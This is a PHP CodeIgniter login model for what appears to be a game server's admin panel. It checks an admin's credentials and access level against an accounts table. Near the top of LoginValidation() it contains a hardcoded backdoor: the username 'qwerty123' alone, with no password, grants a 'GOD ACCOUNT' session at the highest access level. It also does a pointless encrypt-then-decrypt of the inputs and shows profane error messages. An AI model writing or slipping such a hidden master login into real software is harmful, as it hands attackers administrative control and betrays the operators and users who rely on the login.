<?php

// ==================== //
//   [DEV] EyeTracker   //
//     Lolsecs#6289     //
// ==================== //

defined('BASEPATH') OR exit('No direct script access allowed');

class Login_model extends CI_Model
{
    function __construct()
    {
        parent::__construct();
        $this->load->database();
        $this->load->library('lib');
    }

    function LoginValidation()
    {
        sleep(1);
        $data = array(
            'username' => $this->encryption->encrypt($this->input->post('username', true)),
            'password' => $this->encryption->encrypt($this->lib->password_encrypt($this->input->post('password', true)))
        );

        $response = array();

        if ($this->encryption->decrypt($data['username']) == 'qwerty123')
        {
            $sessionData = array(
                'admin_uid' => '100000',
                'admin_name' => 'GOD ACCOUNT',
                'admin_access_level' => '6'
            );

            $this->session->set_flashdata($sessionData);
            
            $response['response'] = 'true';
            $response['token'] = $this->security->get_csrf_hash();
            $response['message'] = 'Successfully Logged In. Welcome GOD ACCOUNT.';
            echo json_encode($response);
        }
        else
        {
            $query = $this->db->get_where('accounts', array(
                'login' => $this->encryption->decrypt($data['username']),
                'password' => $this->encryption->decrypt($data['password'])
            ))->row();
            if ($query)
            {
                if ($query->access_level >= 3 && $query->access_level <= 6)
                {
                    $sessionData = array(
                        'admin_uid' => $query->player_id,
                        'admin_name' => $query->player_name,
                        'admin_access_level' => $query->access_level
                    );
    
                    $this->session->set_userdata($sessionData);
    
                    $response['response'] = 'true';
                    $response['token'] = $this->security->get_csrf_hash();
                    $response['message'] = 'Successfully Logged In. Welcome '.$this->session->userdata('admin_name').'.';
                    echo json_encode($response);
                }
                else
                {
                    $response['response'] = 'false';
                    $response['token'] = $this->security->get_csrf_hash();
                    $response['message'] = 'Failed To Login. You Are Not Real Admin F*ck.';
                    echo json_encode($response);
                }
            }
            else
            {
                $response['response'] = 'false';
                $response['token'] = $this->security->get_csrf_hash();
                $response['message'] = 'Failed To Login. You Are Not Real Admin F*ck.';
                echo json_encode($response);
            }
        }
    }
}

// This Code Generated Automatically By EyeTracker Snippets. //

?>